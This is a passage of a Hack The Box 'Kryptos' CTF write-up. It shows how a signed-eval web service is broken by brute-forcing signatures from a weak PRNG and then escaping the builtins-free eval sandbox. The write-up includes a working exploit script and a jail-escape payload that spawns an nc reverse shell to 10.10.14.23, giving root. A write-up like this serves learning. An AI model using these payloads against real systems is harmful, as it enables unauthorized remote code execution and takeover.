<span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">route</span><span class="p">,</span> <span class="n">run</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">debug</span>
<span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">hook</span>
<span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">response</span> <span class="k">as</span> <span class="n">resp</span>


<span class="k">def</span> <span class="nf">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span>
    <span class="c1"># Taken from the internet - probably secure
</span>    <span class="n">p</span> <span class="o">=</span> <span class="mi">2147483647</span>
    <span class="n">g</span> <span class="o">=</span> <span class="mi">2255412</span>

    <span class="n">keyLength</span> <span class="o">=</span> <span class="mi">32</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">ths</span> <span class="o">=</span> <span class="nb">round</span><span class="p">((</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">keyLength</span><span class="o">*</span><span class="mi">8</span><span class="p">):</span>
        <span class="n">seed</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">g</span><span class="p">,</span><span class="n">seed</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">seed</span> <span class="o">&gt;</span> <span class="n">ths</span><span class="p">:</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="mi">2</span><span class="o">**</span><span class="n">i</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="c1"># Set up the keys
</span><span class="n">seed</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
<span class="n">rand</span> <span class="o">=</span> <span class="n">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
<span class="n">sk</span> <span class="o">=</span> <span class="n">SigningKey</span><span class="p">.</span><span class="n">from_secret_exponent</span><span class="p">(</span><span class="n">rand</span><span class="p">,</span> <span class="n">curve</span><span class="o">=</span><span class="n">NIST384p</span><span class="p">)</span>
<span class="n">vk</span> <span class="o">=</span> <span class="n">sk</span><span class="p">.</span><span class="n">get_verifying_key</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">verify</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">sig</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">vk</span><span class="p">.</span><span class="n">verify</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">sig</span><span class="p">),</span> <span class="n">msg</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">sign</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">binascii</span><span class="p">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">sk</span><span class="p">.</span><span class="n">sign</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span>

<span class="o">@</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s">'GET'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">web_root</span><span class="p">():</span>
    <span class="n">response</span> <span class="o">=</span> <span class="p">{</span><span class="s">'response'</span><span class="p">:</span>
                <span class="p">{</span>
                    <span class="s">'Application'</span><span class="p">:</span> <span class="s">'Kryptos Test Web Server'</span><span class="p">,</span>
                    <span class="s">'Status'</span><span class="p">:</span> <span class="s">'running'</span>
                <span class="p">}</span>
                <span class="p">}</span>
    <span class="k">return</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>

<span class="o">@</span><span class="n">route</span><span class="p">(</span><span class="s">'/eval'</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s">'POST'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">evaluate</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">req_data</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span>
        <span class="n">expr</span> <span class="o">=</span> <span class="n">req_data</span><span class="p">[</span><span class="s">'expr'</span><span class="p">]</span>
        <span class="n">sig</span> <span class="o">=</span> <span class="n">req_data</span><span class="p">[</span><span class="s">'sig'</span><span class="p">]</span>
        <span class="c1"># Only signed expressions will be evaluated
</span>        <span class="k">if</span> <span class="ow">not</span> <span class="n">verify</span><span class="p">(</span><span class="nb">str</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">expr</span><span class="p">),</span> <span class="nb">str</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">sig</span><span class="p">)):</span>
            <span class="k">return</span> <span class="s">"Bad signature"</span>
        <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">expr</span><span class="p">,</span> <span class="p">{</span><span class="s">'__builtins__'</span><span class="p">:</span><span class="bp">None</span><span class="p">})</span> <span class="c1"># Builtins are removed, this should be pretty safe
</span>        <span class="n">response</span> <span class="o">=</span> <span class="p">{</span><span class="s">'response'</span><span class="p">:</span>
                    <span class="p">{</span>
                        <span class="s">'Expression'</span><span class="p">:</span> <span class="n">expr</span><span class="p">,</span>
                        <span class="s">'Result'</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
                    <span class="p">}</span>
                    <span class="p">}</span>
        <span class="k">return</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Error"</span>

<span class="c1"># Generate a sample expression and signature for debugging purposes
</span><span class="o">@</span><span class="n">route</span><span class="p">(</span><span class="s">'/debug'</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s">'GET'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
    <span class="n">expr</span> <span class="o">=</span> <span class="s">'2+2'</span>
    <span class="n">sig</span> <span class="o">=</span> <span class="n">sign</span><span class="p">(</span><span class="nb">str</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">expr</span><span class="p">))</span>
    <span class="n">response</span> <span class="o">=</span> <span class="p">{</span><span class="s">'response'</span><span class="p">:</span>
                <span class="p">{</span>
                    <span class="s">'Expression'</span><span class="p">:</span> <span class="n">expr</span><span class="p">,</span>
                    <span class="s">'Signature'</span><span class="p">:</span> <span class="n">sig</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span>
                <span class="p">}</span>
                <span class="p">}</span>
    <span class="k">return</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>

<span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">81</span><span class="p">,</span> <span class="n">reloader</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</code></pre></div></div>

<p>The first thing that jumps out is the <code class="language-plaintext highlighter-rouge">eval()</code> expression. It’s been somewhat “hardened” since the builtins are disabled, but there’s a way to bypass that. But first, I need to generate a valid signature for the expression to be evaluated.</p>

<p>The second thing is the PRNG function <code class="language-plaintext highlighter-rouge">secure_rng</code> seems suspicious. I’m no crypto or math expert but when I run the function multiple times I see the same values generated quite often which indicates a broken PRNG.</p>

<p>I took the function and put it in a new script to test the entropy of the values generated.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">random</span>

<span class="k">def</span> <span class="nf">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span>
    <span class="c1"># Taken from the internet - probably secure
</span>    <span class="n">p</span> <span class="o">=</span> <span class="mi">2147483647</span>
    <span class="n">g</span> <span class="o">=</span> <span class="mi">2255412</span>

    <span class="n">keyLength</span> <span class="o">=</span> <span class="mi">32</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">ths</span> <span class="o">=</span> <span class="nb">round</span><span class="p">((</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">keyLength</span><span class="o">*</span><span class="mi">8</span><span class="p">):</span>
        <span class="n">seed</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">g</span><span class="p">,</span><span class="n">seed</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">seed</span> <span class="o">&gt;</span> <span class="n">ths</span><span class="p">:</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="mi">2</span><span class="o">**</span><span class="n">i</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
    <span class="n">seed</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
    <span class="n">rand</span> <span class="o">=</span> <span class="n">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
    <span class="k">print</span> <span class="n">rand</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python testrng.py
100
59763658961195455702488250327064726633945798537104807246171656262148713381967
5
115792089237316195423570985008687907853269984665640564039457584007913129639931
7470457370149431962811031290883090829243224817138100905771457032768594248078
25
59763658961195455702488250327064726633945798537104807246171656262148754428249
59763658961195455702488250327064726633945798537104807246171656262148712113590
2
7470457370149431962811031290883090829243224817138100905771457032768589009034
[...]
14940914740298863925622062581766181658486449634276201811542914065537178345491
17
14940914740298863925622062581766181658486449634276201811542914065537188607221
[...]
7470457370149431962811031290883090829243224817138100905771457032768594248078
1
29881829480597727851244125163532363316972899268552403623085828131074356036114
2
38
6
59763658961195455702488250327064726633945798537104807246171656262148712073505
[...]
29881829480597727851244125163532363316972899268552403623085828131074356690984
6
1
59763658961195455702488250327064726633945798537104807246171656262148713381985
11
3735228685074715981405515645441545414621612408569050452885728516384297124039
6
3735228685074715981405515645441545414621612408569050452885728516384297124039
3735228685074715981405515645441545414621612408569050452885728516384378329292
</code></pre></div></div>

<p>Some numbers repeat multiple times which is very unusual. I can test how many tries it takes on average to get a specific value (2 for example):</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">random</span>

<span class="k">def</span> <span class="nf">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span>
    <span class="c1"># Taken from the internet - probably secure
</span>    <span class="n">p</span> <span class="o">=</span> <span class="mi">2147483647</span>
    <span class="n">g</span> <span class="o">=</span> <span class="mi">2255412</span>

    <span class="n">keyLength</span> <span class="o">=</span> <span class="mi">32</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">ths</span> <span class="o">=</span> <span class="nb">round</span><span class="p">((</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">keyLength</span><span class="o">*</span><span class="mi">8</span><span class="p">):</span>
        <span class="n">seed</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">g</span><span class="p">,</span><span class="n">seed</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">seed</span> <span class="o">&gt;</span> <span class="n">ths</span><span class="p">:</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="mi">2</span><span class="o">**</span><span class="n">i</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="n">tries</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">tries</span> <span class="o">=</span> <span class="n">tries</span> <span class="o">+</span> <span class="mi">1</span>
        <span class="n">seed</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
        <span class="n">rand</span> <span class="o">=</span> <span class="n">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
        <span class="k">if</span> <span class="n">rand</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
            <span class="k">break</span>

<span class="k">print</span><span class="p">(</span><span class="s">"It took on average %d times to get the same value twice"</span> <span class="o">%</span> <span class="p">(</span><span class="n">tries</span> <span class="o">/</span> <span class="mi">100</span><span class="p">))</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python testrng.py
It took on average 23 times to get the same value twice
</code></pre></div></div>

<p>This confirms that the PRNG is totally broken. So in theory I should able to submit any eval request and it’ll work after a few attempts. To test, I’ll do a local port forward with SSH first:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ssh -L 81:127.0.0.1:81 rijndael@kryptos.htb
rijndael@kryptos.htb's password:
</code></pre></div></div>

<p>Then I modify the script to take the expression from CLI argument and submit it until I get a valid signature:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"Usage: expr.py &lt;expr&gt;"</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/json"</span><span class="p">}</span>
<span class="n">expr</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="n">tries</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">tries</span> <span class="o">=</span> <span class="n">tries</span> <span class="o">+</span> <span class="mi">1</span>
    <span class="n">seed</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
    <span class="n">rand</span> <span class="o">=</span> <span class="n">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
    <span class="n">sk</span> <span class="o">=</span> <span class="n">SigningKey</span><span class="p">.</span><span class="n">from_secret_exponent</span><span class="p">(</span><span class="n">rand</span><span class="p">,</span> <span class="n">curve</span><span class="o">=</span><span class="n">NIST384p</span><span class="p">)</span>
    <span class="n">vk</span> <span class="o">=</span> <span class="n">sk</span><span class="p">.</span><span class="n">get_verifying_key</span><span class="p">()</span>

    <span class="n">d</span> <span class="o">=</span> <span class="n">create_sig</span><span class="p">(</span><span class="n">expr</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="s">'{ "expr": </span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">, "sig": "%s" }'</span> <span class="o">%</span> <span class="p">(</span><span class="n">expr</span><span class="p">,</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">d</span><span class="p">)[</span><span class="s">'response'</span><span class="p">][</span><span class="s">'Signature'</span><span class="p">])</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://127.0.0.1:81/eval"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="k">if</span> <span class="s">'Bad signature'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">"Found a valid signature after %d tries"</span> <span class="o">%</span> <span class="n">tries</span>
        <span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>
        <span class="nb">exit</span><span class="p">()</span>
</code></pre></div></div>

<p>The script works and after a few seconds I get a valid signature and the expression I submitted gets evaluated.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python expr.py "'This '+'is'+' working'"
Found a valid signature after 4 tries
{
  "response": {
    "Expression": "'This '+'is'+' working'",
    "Result": "This is working"
  }
}
</code></pre></div></div>

<p>Now I need to fix the last part: find a way to bypass the empty builtins set on the eval function. This a classic Python CTF challenge and there are multiple blogs showing various ways to jail escape this.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python expr.py "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 4444 &gt;/tmp/f')"
</code></pre></div></div>

<p>My eval works now and I get a reverse shell as <code class="language-plaintext highlighter-rouge">root</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nc -lvnp 4444
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.129.
Ncat: Connection from 10.10.10.129:44552.
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
6256d6...
</code></pre></div></div>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#crypto" class="page__taxonomy-item" rel="tag">crypto</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#injection" class="page__taxonomy-item" rel="tag">injection</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#jail-escape" class="page__taxonomy-item" rel="tag">jail escape</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#lfi" class="page__taxonomy-item" rel="tag">lfi</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#mysql" class="page__taxonomy-item" rel="tag">mysql</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">php</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#sqli" class="page__taxonomy-item" rel="tag">sqli</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#sqlite" class="page__taxonomy-item" rel="tag">sqlite</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#vim" class="page__taxonomy-item" rel="tag">vim</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-09-21T00:00:00+02:00">September 21, 2019</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-writeup-luke/" class="pagination--pager" title="Luke - Hack The Box
">Previous</a>
    
    
      <a href="/htb-writeup-swagshop/" class="pagination--pager" title="Swagshop - Hack The Box
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">© 2022 HackCommander</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
